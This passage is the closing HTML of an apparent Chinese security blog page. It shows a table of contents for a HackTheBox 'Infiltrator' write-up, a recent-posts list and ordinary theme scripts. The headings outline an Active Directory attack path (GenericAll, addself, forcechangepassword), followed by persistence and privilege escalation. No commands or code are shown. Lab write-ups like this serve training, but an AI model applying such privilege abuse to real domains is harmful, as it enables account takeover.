href="#68-x2e-x41-78-68-69-x52-x53-79-x4e-x40-73-78-70-73-76-x54-x52-x41-x54-x4f-x52-x2e-72-x54-x42-%E2%80%94GenericAll%E2%80%94-MARKETING-68-x49-x47-73-84-65-x4c-64-x49-x4e-70-x49-76-x54-x52-x41-x54-79-82-46-72-84-66"><span class="toc-number">6.3.1.</span> <span class="toc-text">D.ANDERSON@INFILTRATOR.HTB —GenericAll—&gt;MARKETING DIGITAL@INFILTRATOR.HTB</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MARKETING-x44-73-71-73-84-x41-x4c-x40-73-x4e-x46-73-76-84-82-65-x54-79-x52-x2e-x48-84-66-%E2%80%94Contains%E2%80%94-69-x2e-x52-x4f-68-x52-x49-71-85-69-x5a-x40-x49-78-70-x49-x4c-x54-82-x41-x54-x4f-x52-x2e-x48-84-66"><span class="toc-number">6.3.2.</span> <span class="toc-text">MARKETING DIGITAL@INFILTRATOR.HTB —Contains—&gt;E.RODRIGUEZ@INFILTRATOR.HTB</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#x45-x2e-x52-79-x44-x52-x49-71-x55-x45-90-x40-x49-x4e-70-73-76-x54-x52-65-x54-79-x52-x2e-x48-84-x42-x2d-45-45-97-100-x64-x73-101-x6c-f%E2%80%94-CHIEFS-x4d-x41-82-75-69-84-73-x4e-x47-64-73-78-x46-x49-x4c-84-x52-65-x54-79-x52-x2e-x48-84-66"><span class="toc-number">6.3.3.</span> <span class="toc-text">E.RODRIGUEZ@INFILTRATOR.HTB---addself—&gt;CHIEFS MARKETING@INFILTRATOR.HTB</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CHIEFS-x4d-x41-82-x4b-x45-x54-73-78-71-64-x49-x4e-70-x49-x4c-84-x52-x41-x54-79-82-x2e-x48-x54-x42-x2d-x2d-45-x66-111-x72-x63-x65-99-104-x61-x6e-103-101-112-97-115-x73-x77-x6f-114-d%E2%80%94-77-46-x48-65-82-x52-x49-83-64-73-x4e-x46-x49-76-84-82-x41-84-x4f-x52-x2e-72-84-66"><span class="toc-number">6.3.4.</span> <span class="toc-text">CHIEFS MARKETING@INFILTRATOR.HTB---forcechangepassword—&gt;  M.HARRIS@INFILTRATOR.HTB</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81"><span class="toc-number">7.</span> <span class="toc-text">权限维持</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-number">8.</span> <span class="toc-text">提权</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">9.</span> <span class="toc-text">总结</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2024/09/07/HTB-Infiltrator/" title="HTB-Infiltrator"><img src="/img/734167.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="HTB-Infiltrator"/></a><div class="content"><a class="title" href="/2024/09/07/HTB-Infiltrator/" title="HTB-Infiltrator">HTB-Infiltrator</a><time datetime="2024-09-07T07:51:38.000Z" title="发表于 2024-09-07 15:51:38">2024-09-07</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/08/12/sliver%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90-%E5%88%9D%E5%A7%8B%E5%8C%96%E4%BB%A5%E5%8F%8A%E8%84%9A%E6%89%8B%E6%9E%B6/" title="sliver源码分析-初始化以及脚手架"><img src="/img/734167.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="sliver源码分析-初始化以及脚手架"/></a><div class="content"><a class="title" href="/2024/08/12/sliver%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90-%E5%88%9D%E5%A7%8B%E5%8C%96%E4%BB%A5%E5%8F%8A%E8%84%9A%E6%89%8B%E6%9E%B6/" title="sliver源码分析-初始化以及脚手架">sliver源码分析-初始化以及脚手架</a><time datetime="2024-08-12T08:18:02.000Z" title="发表于 2024-08-12 16:18:02">2024-08-12</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/03/10/Android%E8%84%B1%E5%A3%B3/" title="Android脱壳"><img src="/img/girl_flowers_hat_1056408_1920x1080.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Android脱壳"/></a><div class="content"><a class="title" href="/2024/03/10/Android%E8%84%B1%E5%A3%B3/" title="Android脱壳">Android脱壳</a><time datetime="2024-03-10T02:47:02.000Z" title="发表于 2024-03-10 10:47:02">2024-03-10</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/11/19/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97-%E5%A4%96%E5%9B%B4%E6%89%93%E7%82%B9/" title="红蓝对抗-外围打点"><img src="/img/girl_tie_field_1215970_1920x1080.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="红蓝对抗-外围打点"/></a><div class="content"><a class="title" href="/2023/11/19/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97-%E5%A4%96%E5%9B%B4%E6%89%93%E7%82%B9/" title="红蓝对抗-外围打点">红蓝对抗-外围打点</a><time datetime="2023-11-19T08:32:27.000Z" title="发表于 2023-11-19 16:32:27">2023-11-19</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/11/18/%E5%AF%86%E7%A0%81%E7%9B%B8%E5%85%B3/" title="密码相关"><img src="/img/girl_emotion_eyes_1082126_1024x768.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="密码相关"/></a><div class="content"><a class="title" href="/2023/11/18/%E5%AF%86%E7%A0%81%E7%9B%B8%E5%85%B3/" title="密码相关">密码相关</a><time datetime="2023-11-18T14:45:27.000Z" title="发表于 2023-11-18 22:45:27">2023-11-18</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2024 By SUqerBrave</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><div class="aplayer no-destroy" data-id="2116382385" data-server="netease" data-type="song" data-fixed="true" autoplay="true" data-mini="true" data-listFolded="false" data-order="random" data-preload="none" data-autoplay="false" muted></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/metingjs/dist/Meting.min.js"></script><script src="https://cdn.jsdelivr.net/npm/pjax/pjax.min.js"></script><script>let pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]

var pjax = new Pjax({
  elements: 'a:not([target="_blank"])',
  selectors: pjaxSelectors,
  cacheBust: false,
  analytics: false,
  scrollRestoration: false
})

document.addEventListener('pjax:send', function () {

  // removeEventListener
  btf.removeGlobalFnEvent('pjax')
  btf.removeGlobalFnEvent('themeChange')

  document.getElementById('rightside').classList.remove('rightside-show')
  
  if (window.aplayers) {
    for (let i = 0; i < window.aplayers.length; i++) {
      if (!window.aplayers[i].options.fixed) {
        window.aplayers[i].destroy()
      }
    }
  }

  typeof typed === 'object' && typed.destroy()

  //reset readmode
  const $bodyClassList = document.body.classList
  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')

  typeof disqusjs === 'object' && disqusjs.destroy()
})

document.addEventListener('pjax:complete', function () {
  window.refreshFn()

  document.querySelectorAll('script[data-pjax]').forEach(item => {
    const newScript = document.createElement('script')
    const content = item.text || item.textContent || item.innerHTML || ""
    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
    newScript.appendChild(document.createTextNode(content))
    item.parentNode.replaceChild(newScript, item)
  })

  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()

  typeof panguInit === 'function' && panguInit()

  // google analytics
  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});

  // baidu analytics
  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);

  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()

  // prismjs
  typeof Prism === 'object' && Prism.highlightAll()
})

document.addEventListener('pjax:error', e => {
  if (e.request.status === 404) {
    pjax.loadUrl('/404.html')
  }
})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div></body></html>